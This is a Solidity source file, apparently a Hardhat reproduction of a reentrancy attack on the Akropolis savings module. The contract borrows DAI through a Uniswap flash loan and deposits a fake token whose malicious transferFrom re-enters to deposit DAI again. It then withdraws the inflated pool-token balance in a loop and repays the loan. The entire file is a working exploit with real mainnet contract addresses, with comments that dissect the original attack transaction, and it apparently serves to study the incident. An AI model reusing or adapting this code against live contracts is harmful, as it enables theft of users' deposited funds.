//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./ISavingsModule.sol";
import "./IUniswapV2Pair.sol";
import "./ICurveFiProtocol_Y.sol";

contract Exploit2 is ERC20 {

// break down the tx from: https://oko.palkeo.com/0xe2307837524Db8961C4541f943598654240bd62f/calls_from/

// 1. calls savingsModule.poolTokenByProtocol 
// 2. calls balanceOf on dyPoolToken (why, maybe this is a loop?)
// 3. approves spending of contract's DAI by savingsModule
// 4. checks balance of DAI
// 5. calls savingsModule.deposit sending 5000000 of address(this)
// 6. re-entered into address(this).transferFrom, calls  savingsModule.deposit sending 24747400163735396272620 dai
// 7. now they transfer 1 dai, 1*10**18, to curveYPool
// 8. call savingsModule.normalizedBalance
// 9. calls balanceOf on dyPoolToken
// 10. calls savingsModule.withdraw for
//     - dnAmount: 49268.189080 × 10¹⁸ 
//     - _protocol: curveYPool
//     - token: DAI
//     - maxNAmount: 0
// 11. goto line 5 for one more loop.
// 12. approve 0.

    // Pair of akro contracts/tokens:
    address curveYPool = 0x7967adA2A32A633d5C055e2e075A83023B632B4e;
    address dyPoolToken = 0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077;
    // AKRO contract
    ISavingsModule savingsModule = ISavingsModule(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748);
    // DAI/WETH pair for flashloan
    IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); 
    ERC20 dyPool = ERC20(0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077); 
    ICurveFiProtocol_Y AkroYPool = ICurveFiProtocol_Y(curveYPool); 


    uint borrow = 25000*10**18; 
    uint deposit = 24000*10**18; // akro had a deposit cap per user I think it was 25,000.
    uint repay = (borrow * 100301) / 100000;
    uint dyPoolBalance;
    uint daiBalance;
    uint thisSupply = 500000;
    uint nDepositFake;
    uint nDepositDai;
    uint nBalance;
    uint loops;

    event DyPoolBalance(uint indexed state, uint indexed dyBalance);
    event ReEntered(uint indexed dyPoolBalance);

    // state 0: start, should be 0
    // state 1: first, should be < 25000000000000000000000
    // state 2: second, should be > 45000000000000000000000
    // state 3: last, should be less than 24000000000000000000000
    constructor() payable ERC20("Exploit", "XPLT") {
        // doing all the approvals here:
        // approve the akro contract to transfer our DAI 
        dai.approve(address(savingsModule), uint(-1));
        // need to approve the akro contract to transfer our akro pool tokens
        dyPool.approve(address(savingsModule), uint(-1));
        balanceCheck("Deploy");
        address poolToken = savingsModule.poolTokenByProtocol(curveYPool);
        console.log("poolToken: ", poolToken);
    }

    // call this to start the exploit
    function run(uint _loops) external {
        loops = _loops;
        console.log("RUN");
        // take out a dai loan:
        pair.swap(borrow, 0, address(this), "0x");
        // ^^ will call uniswapV2Call
    }

    function uniswapV2Call(address,uint,uint,bytes calldata) external {
        balanceCheck("SWAP");
        
        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("dyPoolBalance:     ", dyPoolBalance);   
        emit DyPoolBalance(0, dyPoolBalance);
        
        // prep savingsModule deposit
        uint[] memory amountsIn = new uint[](1);
        amountsIn[0] = thisSupply;
        address[] memory tokensIn = new address[](1);
        tokensIn[0] = address(this);        
        nDepositFake = savingsModule.deposit(curveYPool, tokensIn, amountsIn);
        console.log("nDepositFake: ", nDepositFake);   
       
        console.log("back to uniswapV2Call");

        // below this we have returned from the malicious transfer from.
        nBalance = AkroYPool.normalizedBalance();
        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("dyPoolBalance:     ", dyPoolBalance);
        emit DyPoolBalance(2, dyPoolBalance);
        savingsModule.withdraw(curveYPool, address(dai), dyPoolBalance*99/100, 0);
        balanceCheck("BACK FROM HACK");
        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("dyPoolBalance left over:     ", dyPoolBalance);  
        emit DyPoolBalance(3, dyPoolBalance);

        for(uint i = 0;i < loops; i++){
            savingsModule.deposit(curveYPool, tokensIn, amountsIn);
            dyPoolBalance = dyPool.balanceOf(address(this));
            savingsModule.withdraw(curveYPool, address(dai), dyPoolBalance*99/100, 0);            
        }

        bool daiSuccess = dai.transfer(address(pair), repay);
        balanceCheck("PROFIT");


    }
    // transferFrom, a.k.a. "Eye am the Captain now".
    // this will be the malicious implementation *one million dollars*
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        console.log("transferFrom");
        emit ReEntered(dyPoolBalance);
        address[] memory tokensIn = new address[](1);
        tokensIn[0] = address(dai);
        uint[] memory amountsIn = new uint[](1);
        amountsIn[0] = deposit;
        nDepositDai = savingsModule.deposit(curveYPool, tokensIn, amountsIn);
        console.log("nDepositDai    :", nDepositDai);   

        dyPoolBalance = dyPool.balanceOf(address(this));
        console.log("dyPoolBalance DAI:     ", dyPoolBalance);   
        emit DyPoolBalance(1, dyPoolBalance);

        return dai.transferFrom(address(this), curveYPool, 1*10**18);
        //return true;
        
    }    

    receive() external payable {}
    function balanceCheck(string memory title) internal {
        console.log("------------------------");
        console.log(title);
        daiBalance = dai.balanceOf(address(this));
        console.log("DAI: ", daiBalance / 10**18);   

    }

}






























